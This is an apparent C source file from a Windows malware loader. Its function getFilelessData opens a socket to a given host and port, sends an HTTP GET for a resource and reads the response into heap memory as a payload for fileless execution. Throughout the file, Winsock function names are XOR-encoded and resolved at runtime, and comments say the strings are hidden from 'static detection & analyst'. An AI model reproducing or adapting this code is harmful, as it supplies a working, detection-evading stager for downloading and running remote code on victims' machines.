#include "common.h"

#define DEFAULT_BUFLEN 2048

int (WINAPI* pWSAStartup)(WORD wVersionRequired, LPWSADATA lpWSAData);
int (WINAPI* pGetAddrInfo)(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*);
int (WINAPI* pWSACleanup)();
int (WINAPI* pRecv)(SOCKET, char*, int, int);
int (WINAPI* pSend)(SOCKET, const char*, int, int);
int (WINAPI* pShutdown)(SOCKET, int);
SOCKET(WINAPI* pSocket)(int, int, int);
int (WINAPI* pClosesocket)(SOCKET);
int (WINAPI* pConnect)(SOCKET, const struct sockaddr*, int);
void (WINAPI* pFreeAddrInfo)(ADDRINFOA*);


DATA getFilelessData(char* host, char* port, char* resource, HMODULE hModule, LoadLibraryA_t pLoadLibraryA) {
    
    size_t keyLen = sizeof(xorKey);

    HANDLE    hEvent = CreateEvent(NULL, NULL, NULL, NULL);
    DATA data = { 0 };

    PBYTE		pBytes = NULL;
    SIZE_T		sSize = NULL;

    //std::vector<unsigned char> buffer;

    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo* result = NULL, * ptr = NULL, hints;
    char sendbuf[MAX_PATH] = "";

    char get[] = { 0x4, 0x2a, 0x3a, 0x56, 0x4a, 0x0 }; // to staticly hide "GET /" from static detection & analyst 
    XORNull((char*)get, sizeof(get), (char*)xorKey, keyLen);

    StringConcatA(sendbuf, get);
    XORNull((char*)get, sizeof(get), (char*)xorKey, keyLen); // to hide "GET /" in memory

    StringConcatA(sendbuf, resource);
    xor_aa((BYTE*)resource, sizeof(resource)); // to hide whatever resource string is in memory


    char recvbuf[DEFAULT_BUFLEN]; // receiving 1 kB each ~3s
    memset(recvbuf, 0, DEFAULT_BUFLEN);

    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;


    if (hModule != nullptr) {
        char sWsaStartup[] = { 0x14, 0x3c, 0x2f, 0x25, 0x11, 0x13, 0x6, 0x30, 0x10, 0x16, 0x0 };
        XORNull((char*)sWsaStartup, sizeof(sWsaStartup), (char*)xorKey, keyLen);
        pWSAStartup = reinterpret_cast<int (WINAPI*)(WORD, LPWSADATA)>(hlpGetProcAddress(hModule, sWsaStartup, pLoadLibraryA));
        XORNull((char*)sWsaStartup, sizeof(sWsaStartup), (char*)xorKey, keyLen);
    }
    else {
        return { 0 };
    }

    // Initialize Winsock
    iResult = pWSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != 0) {
        return { 0 };
    }

    char sWSACleanup[] = { 0x14, 0x3c, 0x2f, 0x35, 0x9, 0x17, 0x15, 0x2a, 0x10, 0x16, 0x0 };
    XORNull((char*)sWSACleanup, sizeof(sWSACleanup), (char*)xorKey, keyLen);
    pWSACleanup = reinterpret_cast<int (WINAPI*)()>(hlpGetProcAddress(hModule, sWSACleanup, pLoadLibraryA));
    XORNull((char*)sWSACleanup, sizeof(sWSACleanup), (char*)xorKey, keyLen);
    ZeroMemory(&hints, sizeof(hints));

    hints.ai_family = PF_INET;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    char sGetAddrInfo[] = { 0x2e, 0x16, 0x30, 0x8, 0x5, 0x8, 0x1d, 0xe, 0x23, 0x3, 0x1c, 0x0 };
    XORNull((char*)sGetAddrInfo, sizeof(sGetAddrInfo), (char*)xorKey2, sizeof(xorKey2));
    pGetAddrInfo = reinterpret_cast<int (WINAPI*)(PCSTR, PCSTR, const ADDRINFOA*, PADDRINFOA*)>(hlpGetProcAddress(hModule, sGetAddrInfo, pLoadLibraryA));
    XORNull((char*)sGetAddrInfo, sizeof(sGetAddrInfo), (char*)xorKey2, sizeof(xorKey2));
    // Resolve the server address and port
    iResult = pGetAddrInfo(host, port, &hints, &result);
    if (iResult != 0) {
        pWSACleanup();
        return { 0 };
    }

    // Attempt to connect to an address until one succeeds
    for (ptr = result; ptr != NULL; ptr = ptr->ai_next) {
        char sSocket[] = { 0x3a, 0x1c, 0x27, 0x2, 0x4, 0x18, 0x0 };
        XORNull((char*)sSocket, sizeof(sSocket), (char*)xorKey2, sizeof(xorKey2));
        pSocket = reinterpret_cast<SOCKET(WINAPI*)(int, int, int)>(hlpGetProcAddress(hModule, sSocket, pLoadLibraryA));
        XORNull((char*)sSocket, sizeof(sSocket), (char*)xorKey2, sizeof(xorKey2));
        // Create a SOCKET for connecting to server
        ConnectSocket = pSocket(ptr->ai_family, ptr->ai_socktype,
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            pWSACleanup();
            return { 0 };
        }

        // Connect to server.
        //PRINTA("[+] C to %s:%s", host, port);
        char sConnect[] = { 0x2a, 0x1c, 0x2a, 0x7, 0x4, 0xf, 0x1b, 0x0 };
        XORNull((char*)sConnect, sizeof(sConnect), (char*)xorKey2, sizeof(xorKey2));
        pConnect = reinterpret_cast<int (WINAPI*)(SOCKET, const struct sockaddr*, int)>(hlpGetProcAddress(hModule, sConnect, pLoadLibraryA));
        XORNull((char*)sConnect, sizeof(sConnect), (char*)xorKey2, sizeof(xorKey2));
        iResult = pConnect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);

        char sCloseSocket[] = { 0xc9, 0xc6, 0xc5, 0xd9, 0xcf, 0xd9, 0xc5, 0xc9, 0xc1, 0xcf, 0xde, 0xaa };
        xor_aa((BYTE*)sCloseSocket, sizeof(sCloseSocket));
        pClosesocket = reinterpret_cast<int (WINAPI*)(SOCKET)>(hlpGetProcAddress(hModule, sCloseSocket, pLoadLibraryA));
        xor_aa((BYTE*)sCloseSocket, sizeof(sCloseSocket));
        if (iResult == SOCKET_ERROR) {
            pClosesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }
    
    char sFreeAddrInfo[] = { 0x25, 0x1d, 0xb, 0x13, 0x4, 0x16, 0x10, 0x36, 0xc, 0x8, 0x7, 0x1a, 0x0 };
    XORNull((char*)sFreeAddrInfo, sizeof(sFreeAddrInfo), (char*)xorKey, keyLen);
    pFreeAddrInfo = reinterpret_cast<void (WINAPI*)(ADDRINFOA*)>(hlpGetProcAddress(hModule, sFreeAddrInfo, pLoadLibraryA));
    XORNull((char*)sFreeAddrInfo, sizeof(sFreeAddrInfo), (char*)xorKey, keyLen);
    pFreeAddrInfo(result);

    if (ConnectSocket == INVALID_SOCKET) {
        pWSACleanup();
        return { 0 };
    }
    char sSend[] = { 0x3a, 0x16, 0x2a, 0xd, 0x0 };
    XORNull((char*)sSend, sizeof(sSend), (char*)xorKey2, sizeof(xorKey2));
    pSend = reinterpret_cast<int (WINAPI*)(SOCKET, const char*, int, int)>(hlpGetProcAddress(hModule, sSend, pLoadLibraryA));
    XORNull((char*)sSend, sizeof(sSend), (char*)xorKey2, sizeof(xorKey2));

    // Send an initial buffer
    iResult = pSend(ConnectSocket, sendbuf, (int)strlen(sendbuf), 0);
    if (iResult == SOCKET_ERROR) {
        pClosesocket(ConnectSocket);
        pWSACleanup();
        return { 0 };
    }

    //PRINTA("\n[+] Sent %ld B\n", iResult);
    char sShutDown[] = { 0xd9, 0xc2, 0xdf, 0xde, 0xce, 0xc5, 0xdd, 0xc4, 0xaa };
    xor_aa((BYTE*)sShutDown, sizeof(sShutDown));
    pShutdown = reinterpret_cast<int (WINAPI*)(SOCKET, int)>(hlpGetProcAddress(hModule, sShutDown, pLoadLibraryA));
    xor_aa((BYTE*)sShutDown, sizeof(sShutDown));

    // shutdown the connection since no more data will be sent
    iResult = pShutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        pClosesocket(ConnectSocket);
        pWSACleanup();
        return { 0 };
    }
    char sRecv[] = { 0x3b, 0x16, 0x27, 0x1f, 0x0 };
    XORNull((char*)sRecv, sizeof(sRecv), (char*)xorKey2, sizeof(xorKey2));
    pRecv = reinterpret_cast<int (WINAPI*)(SOCKET, char*, int, int)>(hlpGetProcAddress(hModule, sRecv, pLoadLibraryA));
    XORNull((char*)sRecv, sizeof(sRecv), (char*)xorKey2, sizeof(xorKey2));
    // Receive until the peer closes the connection
    do {
        iResult = pRecv(ConnectSocket, (char*)recvbuf, recvbuflen, 0);
        
        if (iResult > 0){
            //PRINTA("[+] Received %d B\n", iResult);
        }
        else if (iResult == 0){
            //PRINTA("[+] C closed\n");
        }
        else {
            //PRINTA("receiving failed with error: \n");
        }
        
        // Calculating the total size of the total buffer 
        sSize += iResult;
        // In case the total buffer is not allocated yet
        // then allocate it equal to the size of the bytes read since it may be less than 1024 bytes
        if (pBytes == NULL){
            pBytes = (PBYTE)LocalAlloc(LPTR, iResult);
        }
        else {
            // Otherwise, reallocate the pBytes to equal to the total size, sSize.
            // This is required in order to fit the whole payload
            pBytes = (PBYTE)LocalReAlloc(pBytes, sSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
        }
        if (pBytes == NULL) {
            break;
        }
        // Append the temp buffer to the end of the total buffer
        CopyMemoryEx((PVOID)(pBytes + (sSize - iResult)), recvbuf, iResult);

        //buffer.insert(buffer.end(), recvbuf, recvbuf + iResult);
        memset(recvbuf, 0, DEFAULT_BUFLEN);
        //printf("[+] Encrypting Heaps/Stacks ...\n\n\n");
        //HappySleep();
        //MsgWaitForMultipleObjectsEx(1, &hEvent, 999, QS_HOTKEY, NULL);
        
    } while (iResult > 0);


    // cleanup
    pClosesocket(ConnectSocket);
    pWSACleanup();
   
    
    //char * bufdata = nullptr;
    //sysZwAllocateVirtualMemory(NtCurrentProcess(), reinterpret_cast<PVOID*>(&bufdata), 0, &sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    //(char*)VirtualAlloc(NULL, sSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    char* bufdata = (char*)HeapAlloc(GetProcessHeapFromTeb(), 0, sSize);
    for (int i = 0; i < sSize; i++) {
        bufdata[i] = pBytes[i];
    }
    data.data = bufdata;
    data.len = sSize;

    LocalFree(pBytes);
    //HeapFree(GetProcessHeapFromTeb(), 0, bufdata);
    return data; 

}